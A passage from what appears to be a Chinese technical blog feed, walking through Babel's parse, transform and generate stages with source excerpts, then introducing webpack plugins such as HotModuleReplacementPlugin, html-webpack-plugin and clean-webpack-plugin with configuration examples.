punctuation">(</span>code<span class="token punctuation">,</span> parserOpts<span class="token punctuation">,</span> parse<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>ast <span class="token operator">!==</span> undefined<span class="token punctuation">)</span> results<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>ast<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>results<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">parse</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> parserOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>results<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// If we want to allow async parsers</span>      <span class="token operator">...</span>      <span class="token keyword">return</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"More than one plugin attempted to override parsing."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在回过头来看前面的循环就很好理解了，遍历插件，插件中如果定义了 parserOverride 方法，就认为用户指定了自定义的编译器。从代码中得知，插件定义的编译器最多只能是一个，否则 babel 会不知道执行哪个编译器。</p><p>如下是一个自定义编译器插件的例子。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> parse <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"custom-fork-of-babel-parser-on-npm-here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>    <span class="token function">parserOverride</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> opts<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">parse</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JS 转换为 AST 的过程依赖于 @babel/parser，用户已可以通过插件的方式自己写一个 parser 来覆盖默认的。@babel/parser 的过程还是挺复杂的，后续我们单独分析它，这里只要知道它是将 JS 代码转换成 AST 就可以了。</p><h3 id="转换（transform）"><a href="#转换（transform）" class="headerlink" title="转换（transform）"></a>转换（transform）</h3><p>AST 需要根据插件内容做一些变换，我们先大概的看下一个插件长什么样子。如下所示，Babel 插件返回一个 function ，入参为 babel 对象，返回 Object。其中 pre, post 分别在进入/离开 AST 的时候触发，所以一般分别用来做初始化/删除对象的操作。visitor（访问者）定义了用于在一个树状结构中获取具体节点的方法。</p><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">(</span>babel<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    <span class="token function">pre</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>runtimeData <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    visitor<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function">post</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">delete</span> <span class="token keyword">this</span><span class="token punctuation">.</span>runtimeData    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>理解了插件的结构之后，再看 transformFile 方法就比较简单了。首先 babel 为插件集合增加了一个 loadBlockHoistPlugin 的插件，用于排序的，无需深究。然后就是执行插件的 pre 方法，等待所有插件的 pre 方法都执行完毕后，执行 visitor 中的方法（并不是简单的执行方法，而是根据访问者模式在遇到相应的节点或属性的时候执行，具体规则见<a href="https://link.zhihu.com/?target=https%3A//github.com/jamiebuilds/babel-handbook/blob/master/translations/zh-Hans/plugin-handbook.md%23toc-stages-of-babel" target="_blank" rel="noopener">Babel 插件手册</a>），为了优化，babel 将多个 visitor 合并成一个，使用 traverse 遍历 AST 节点，在遍历过程中执行插件。最后执行插件的 post 方法。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> traverse <span class="token keyword">from</span> <span class="token string">"@babel/traverse"</span><span class="token punctuation">;</span><span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">transformFile</span><span class="token punctuation">(</span>file<span class="token punctuation">:</span> File<span class="token punctuation">,</span> pluginPasses<span class="token punctuation">:</span> PluginPasses<span class="token punctuation">)</span><span class="token punctuation">:</span> Handler<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> pluginPairs <span class="token keyword">of</span> pluginPasses<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> passPairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> passes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> visitors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> plugin <span class="token keyword">of</span> pluginPairs<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">loadBlockHoistPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> pass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PluginPass</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> plugin<span class="token punctuation">.</span>key<span class="token punctuation">,</span> plugin<span class="token punctuation">.</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>      passPairs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>plugin<span class="token punctuation">,</span> pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      passes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">;</span>      visitors<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>plugin<span class="token punctuation">.</span>visitor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>plugin<span class="token punctuation">,</span> pass<span class="token punctuation">]</span> <span class="token keyword">of</span> passPairs<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> fn <span class="token operator">=</span> plugin<span class="token punctuation">.</span>pre<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> result <span class="token operator">=</span> fn<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>pass<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">...</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// merge all plugin visitors into a single visitor</span>    <span class="token keyword">const</span> visitor <span class="token operator">=</span> traverse<span class="token punctuation">.</span>visitors<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>      visitors<span class="token punctuation">,</span>      passes<span class="token punctuation">,</span>      file<span class="token punctuation">.</span>opts<span class="token punctuation">.</span>wrapPluginVisitorMethod<span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">traverse</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>ast<span class="token punctuation">,</span> visitor<span class="token punctuation">,</span> file<span class="token punctuation">.</span>scope<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>plugin<span class="token punctuation">,</span> pass<span class="token punctuation">]</span> <span class="token keyword">of</span> passPairs<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> fn <span class="token operator">=</span> plugin<span class="token punctuation">.</span>post<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> result <span class="token operator">=</span> fn<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>pass<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">yield</span><span class="token operator">*</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">...</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该阶段的核心是插件，插件使用 visitor 访问者模式定义了遇到特定的节点后如何进行操作。babel 将对AST 树的遍历和对节点的增删改等方法放在了 @babel/traverse 包中。</p><h3 id="生成（generate）"><a href="#生成（generate）" class="headerlink" title="生成（generate）"></a>生成（generate）</h3><p>AST 转换完毕后，需要将 AST 重新生成 code。</p><p>@babel/generator 提供了默认的 generate 方法，如果需要定制的话，可以通过插件的 generatorOverride 方法自定义一个。这个方法和第一个阶段的 parserOverride 是相对应的。生成目标代码后，还会同时生成 sourceMap 相关的代码。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> generate <span class="token keyword">from</span> <span class="token string">"@babel/generator"</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">generateCode</span><span class="token punctuation">(</span>  pluginPasses<span class="token punctuation">:</span> PluginPasses<span class="token punctuation">,</span>  file<span class="token punctuation">:</span> File<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  outputCode<span class="token punctuation">:</span> string<span class="token punctuation">,</span>  outputMap<span class="token punctuation">:</span> SourceMap <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">}</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span> opts<span class="token punctuation">,</span> ast<span class="token punctuation">,</span> code<span class="token punctuation">,</span> inputMap <span class="token punctuation">}</span> <span class="token operator">=</span> file<span class="token punctuation">;</span>  <span class="token keyword">const</span> results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> plugins <span class="token keyword">of</span> pluginPasses<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> plugin <span class="token keyword">of</span> plugins<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token punctuation">{</span> generatorOverride <span class="token punctuation">}</span> <span class="token operator">=</span> plugin<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>generatorOverride<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">generatorOverride</span><span class="token punctuation">(</span>          ast<span class="token punctuation">,</span>          opts<span class="token punctuation">.</span>generatorOpts<span class="token punctuation">,</span>          code<span class="token punctuation">,</span>          generate<span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">!==</span> undefined<span class="token punctuation">)</span> results<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>results<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    result <span class="token operator">=</span> <span class="token function">generate</span><span class="token punctuation">(</span>ast<span class="token punctuation">,</span> opts<span class="token punctuation">.</span>generatorOpts<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>results<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    result <span class="token operator">=</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">...</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"More than one plugin attempted to override codegen."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> <span class="token punctuation">{</span> code<span class="token punctuation">:</span> outputCode<span class="token punctuation">,</span> map<span class="token punctuation">:</span> outputMap <span class="token punctuation">}</span> <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>outputMap <span class="token operator">&amp;&amp;</span> inputMap<span class="token punctuation">)</span> <span class="token punctuation">{</span>    outputMap <span class="token operator">=</span> <span class="token function">mergeSourceMap</span><span class="token punctuation">(</span>inputMap<span class="token punctuation">.</span><span class="token function">toObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> outputMap<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>sourceMaps <span class="token operator">===</span> <span class="token string">"inline"</span> <span class="token operator">||</span> opts<span class="token punctuation">.</span>sourceMaps <span class="token operator">===</span> <span class="token string">"both"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    outputCode <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">"\n"</span> <span class="token operator">+</span> convertSourceMap<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span>outputMap<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>sourceMaps <span class="token operator">===</span> <span class="token string">"inline"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    outputMap <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span> outputCode<span class="token punctuation">,</span> outputMap <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> babel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
            <tag> babel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18个webpack插件</title>
      <link href="2021/04/25/18%E4%B8%AAwebpack%E6%8F%92%E4%BB%B6/"/>
      <url>2021/04/25/18%E4%B8%AAwebpack%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>何为插件(Plugin)？专注处理 webpack 在编译过程中的某个特定的任务的功能模块，可以称为插件。</p><p>Plugin 是一个扩展器，它丰富了 webpack 本身，针对是 loader 结束后，webpack 打包的整个过程，它并不直接操作文件，而是基于事件机制工作，会监听 webpack 打包过程中的某些节点，执行广泛的任务。</p><p>Plugin 的特点</p><ul><li>是一个独立的模块</li><li>模块对外暴露一个 js 函数</li><li>函数的原型 <code>(prototype)</code> 上定义了一个注入 <code>compiler</code> 对象的 <code>apply</code>方法 <code>apply</code> 函数中需要有通过 <code>compiler</code> 对象挂载的 <code>webpack</code> 事件钩子，钩子的回调中能拿到当前编译的 <code>compilation</code> 对象，如果是异步编译插件的话可以拿到回调 <code>callback</code></li><li>完成自定义子编译流程并处理 <code>complition</code> 对象的内部数据</li><li>如果异步编译插件的话，数据处理完成后执行 <code>callback</code> 回调。</li></ul><h2 id="HotModuleReplacementPlugin"><a href="#HotModuleReplacementPlugin" class="headerlink" title="HotModuleReplacementPlugin"></a>HotModuleReplacementPlugin</h2><p>模块热更新插件。<code>Hot-Module-Replacement</code> 的热更新是依赖于 <code>webpack-dev-server</code>，后者是在打包文件改变时更新打包文件或者 reload 刷新整个页面，<code>HRM</code> 是只更新修改的部分。</p><p><code>HotModuleReplacementPlugin</code>是<code>webpack</code>模块自带的，所以引入<code>webpack</code>后，在<code>plugins</code>配置项中直接使用即可。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>HotModuleReplacementPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 热更新插件</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="html-webpack-plugin"><a href="#html-webpack-plugin" class="headerlink" title="html-webpack-plugin"></a>html-webpack-plugin</h2><p>生成 html 文件。将 webpack 中<code>entry</code>配置的相关入口 <code>chunk</code> 和 <code>extract-text-webpack-plugin</code>抽取的 css 样式 插入到该插件提供的<code>template</code>或者<code>templateContent</code>配置项指定的内容基础上生成一个 html 文件，具体插入方式是将样式<code>link</code>插入到<code>head</code>元素中，<code>script</code>插入到<code>head</code>或者<code>body</code>中。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span><span class="token punctuation">,</span>    template<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    minify<span class="token punctuation">:</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 压缩HTML文件</span>      removeComments<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 移除HTML中的注释</span>      collapseWhitespace<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 删除空白符与换行符</span>      minifyCSS<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 压缩内联css</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    inject<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>inject 有四个选项值</p><ul><li>true：默认值，<code>script</code> 标签位于 <code>html</code> 文件的 <code>body</code> 底部</li><li>body：<code>script</code> 标签位于 <code>html</code> 文件的 <code>body</code> 底部（同 true）</li><li>head：<code>script</code> 标签位于 <code>head</code> 标签内</li><li>false：不插入生成的 js 文件，只是单纯的生成一个 <code>html</code> 文件</li></ul><p>多页应用打包</p><p>有时，我们的应用不一定是一个单页应用，而是一个多页应用，那么如何使用 webpack 进行打包呢。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  entry<span class="token punctuation">:</span> <span class="token punctuation">{</span>    index<span class="token punctuation">:</span> <span class="token string">'./src/index.js'</span><span class="token punctuation">,</span>    login<span class="token punctuation">:</span> <span class="token string">'./src/login.js'</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    filename<span class="token punctuation">:</span> <span class="token string">'[name].[hash:6].js'</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//...</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      template<span class="token punctuation">:</span> <span class="token string">'./public/index.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//打包后的文件名</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      template<span class="token punctuation">:</span> <span class="token string">'./public/login.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'login.html'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//打包后的文件名</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果需要配置多个 <code>HtmlWebpackPlugin</code>，那么 <code>filename</code> 字段不可缺省，否则默认生成的都是 <code>index.html</code>。</p><p>但是有个问题，<code>index.html</code> 和 <code>login.html</code> 会发现，都同时引入了 <code>index.f7d21a.js</code> 和 <code>login.f7d21a.js</code>，通常这不是我们想要的，我们希望 <code>index.html</code> 中只引入 <code>index.f7d21a.js</code>，<code>login.html</code> 只引入 <code>login.f7d21a.js</code>。</p><p><code>HtmlWebpackPlugin</code> 提供了一个 <code>chunks</code> 的参数，可以接受一个数组，配置此参数仅会将数组中指定的 js 引入到 html 文件中</p><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//...</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      template<span class="token punctuation">:</span> <span class="token string">'./public/index.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//打包后的文件名</span>      chunks<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      template<span class="token punctuation">:</span> <span class="token string">'./public/login.html'</span><span class="token punctuation">,</span>      filename<span class="token punctuation">:</span> <span class="token string">'login.html'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//打包后的文件名</span>      chunks<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样执行 <code>npm run build</code>，可以看到 <code>index.html</code> 中仅引入了 index 的 js 文件，而 <code>login.html</code> 中也仅引入了 login 的 js 文件。</p><h2 id="clean-webpack-plugin"><a href="#clean-webpack-plugin" class="headerlink" title="clean-webpack-plugin"></a>clean-webpack-plugin</h2><p><code>clean-webpack-plugin</code> 用于在打包前清理上一次项目生成的 bundle 文件，它会根据 <code>output.path</code> 自动清理文件夹；这个插件在生产环境用的频率非常高，因为生产环境经常会通过 hash 生成很多 bundle 文件，如果不进行清理的话每次都会生成新的，导致文件夹非常庞大。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> CleanWebpackPlugin <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'clean-webpack-plugin'</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    template<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 所要清理的文件夹名称</span><span class="token punctuation">]</span><span aria-hidden="true" 